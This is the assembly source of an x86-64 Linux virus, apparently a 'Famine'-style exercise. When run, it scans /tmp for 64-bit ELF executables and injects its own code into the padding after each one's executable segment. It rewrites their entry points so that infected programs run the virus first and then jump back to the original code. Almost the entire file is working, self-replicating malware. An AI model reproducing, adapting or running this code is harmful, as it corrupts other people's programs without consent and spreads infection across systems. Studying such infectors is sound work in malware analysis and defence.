%include "famine.inc"

BUF_SIZE    equ 1024
LOCAL_VARS  equ 1024

bits 64
default rel
global _start
section .text

strlen:         xor         rax, rax
.loop:          cmp         byte [rax + rdi], 0
                jz          .done
                inc         rax
                jmp         .loop
.done:          ret


puts:           call        strlen
                mov         rdx, rax
                mov         rsi, rdi
                mov         rdi, 1
                mov         rax, __NR_write
                syscall
                ret

_host:          lea         rdi, [rel hello]
                call        puts

                xor         rdi, rdi
                mov         rax, __NR_exit
                syscall
hello           db          "hello world",33,10,0
                times 128 - $ + strlen db 0x90



_start:
                push        rdi
                push        rsi
                push        rcx
                push        rdx

                lea         rax, [rel _start]
                mov         rdx, [rel pie_address]
                sub         rax, rdx
                add         rax, [rel entry]
                push        rax

                lea         rdi, [rel slash_tmp]
                mov         rsi, O_RDONLY | O_DIRECTORY
                mov         rax, __NR_open
                syscall
                test        rax, rax
                jl          _return

                mov         [rsp-0x30], rax                     ;rsp-0x30 = directory_fd

                mov         rdi, rax
                mov         rax, __NR_fchdir
                syscall
                test        rax, rax
                jl          _return


scandir:        mov         rdx, BUF_SIZE
                lea         rsi, [rsp - (BUF_SIZE + LOCAL_VARS)]
                mov         rdi, [rsp-0x30]             ;directory fd
                mov         rax, __NR_getdents64
                syscall
                test        rax, rax
                jle         .close

                mov         [rsp-0x38], rax                     ; nread from getdents64
                xor         rdx, rdx
                mov         [rsp-0x40], rdx                     ;rsp-0x40 = getdents_idx

.file:

                lea         rdi, [rsp - (BUF_SIZE + LOCAL_VARS)]
                add         rdi, [rsp-0x40]

                cmp         byte [rdi + 18], DT_REG
                jne         .next

                add         rdi, 19                             ; d_name[]
                call        process

.next:

                lea         rdi, [rsp - (BUF_SIZE + LOCAL_VARS)]
                add         rdi, [rsp-0x40]
                movzx       rax, word [rdi + 16]                ; d_reclen
                add         rax, [rsp-0x40]
                mov         [rsp-0x40], rax
                mov         rdx, [rsp-0x38]                     ; compare getdents64 idx vs nread
                cmp         rax, rdx                            ;
                jl          .file
                jmp         scandir

.close:         mov         rdi, [rsp-0x30]
                mov         rax, __NR_close
                syscall
_return:
                pop         rax

                pop         rdx
                pop         rcx
                pop         rsi
                pop         rdi

                jmp         rax

process:                                                         ; expecting filename in rdi
                mov         rsi, O_RDWR
                mov         rax, __NR_open
                syscall
                test        rax, rax
                jl          .return

                mov         [rsp-0x48], rax                     ; rsp-0x48 = infect_fd

                lea         rsi, [rsp - 0x148]                  ; rsp-0x148 = fstat buf
                mov         rdi, [rsp-0x48]
                mov         rax, __NR_fstat
                syscall
                cmp         rax, 0
                jnz         .close

                mov         rax, qword [rsp - (0x148-0x30)]     ; st_size
                mov         [rsp-0x50], rax                     ; rsp-0x50 = infect_fsize

                xor         r9, r9
                mov         r8, [rsp-0x48]
                mov         r10, MAP_SHARED
                mov         rdx, PROT_READ | PROT_WRITE
                mov         rsi, rax
                xor         rdi, rdi
                mov         rax, __NR_mmap
                syscall
                cmp         rax, -4095
                jae         .close

                mov         [rsp-0x58], rax                     ;rsp-0x58 = infect_mem
                mov         rdi, rax
                call        is_valid_elf64
                cmp         rax, 1
                jnz         .unmap

                call        insert


.unmap:         mov         rsi, [rsp-0x50]                     ; infect_fsize
                mov         rdi, [rsp-0x58]                     ; infect_mem
                mov         rax, __NR_munmap
                syscall

.close:         mov         rdi, [rsp-0x48]
                mov         rax, __NR_close
                syscall
.return:        ret

is_valid_elf64:                                                 ; expecing data in rdi
                xor         rax, rax                            ; result in rax; 1 = valid
                cmp         qword [rdi + 8], rax
                jnz         .return
                mov         rdx, ELF_SYSV
                cmp         qword [rdi], rdx
                jz          .continue
                mov         rdx, ELF_GNU
                cmp         qword [rdi], rdx
                jnz         .return
.continue:      mov         rdx, ELF64_ET_DYN
                cmp         qword [rdi + 0x10], rdx
                jz          .ok
                mov         rdx, ELF64_ET_EXEC
                cmp         qword [rdi + 0x10], rdx
                jnz         .return
.ok:            inc         rax
.return:        ret

insert:                                                         ; expecting data in rdi
                push        r13
                push        r14
                push        r15

                mov         r15, rdi

                mov         rdx, qword [r15 + 0x18]             ; entry point
                mov         rax, qword [rdi + 0x20]             ; e_phoff
                add         rdi, rax                            ; rdi = *Elf64_Phdr
                movzx       rcx, word [rdi + 0x38]              ; e_phnum
.segment:       cmp         rcx, 0
                jle         .return
                mov         rax, 0x0000000500000001             ; p_flags = PF_X | PF_R, p_type = PT_LOAD
                cmp         rax, qword [rdi]
                jnz         .next
                mov         rax, qword [rdi + 0x10]             ; p_vaddr
                cmp         rdx, rax
                jb          .next
                add         rax, qword [rdi + 0x28]             ; p_vaddr + p_memsz
                mov         r13, rax                            ; new entry point
                cmp         rdx, rax
                jae         .next

                mov         rax, qword [rdi + 0x08]             ; rax = p_offset
                add         rax, qword [rdi + 0x20]             ; rax += p_filesz

                mov         r14, rdi                            ; code segment Elf64_Phdr*

                lea         rdi, [r15 + rax]                     ; data + p_offset + p_filesz
                mov         rsi, rdi                            ; save: end of segment
                xor         al, al
                mov         rcx, _finish - _start
                repz        scasb
                test        rcx, rcx
                ja          .return                             ; not enough room

                lea         rdi, [rel _start]
                xchg        rdi, rsi
                mov         rcx, _finish - _start
                repnz       movsb

                ;r15 = beginning of file
                ;r14 = code segment header
                ;r13 = new entry point

                mov         rax, qword [r15 + 0x18]             ; entry point
                mov         [rdi - 0x08], rax                   ; _finish - 8 = entry
                mov         [rdi - 0x10], r13                   ; _finish - 16 = pie_address
                mov         qword [r15 + 0x18], r13             ; fix entry point
                mov         rax, _finish - _start
                add         qword [r14 + 0x20], rax             ; increase p_filesz
                add         qword [r14 + 0x28], rax             ; increase p_memsz
                jmp         .return

.next:          add         rdi, 0x38                           ; sizeof(Elf64_Phdr)
                dec         rcx
                jmp         .segment

.return:
                pop         r15
                pop         r14
                pop         r13
                ret

slash_tmp   db "/tmp",0
pie_address dq _start
entry       dq _host
_finish     equ $
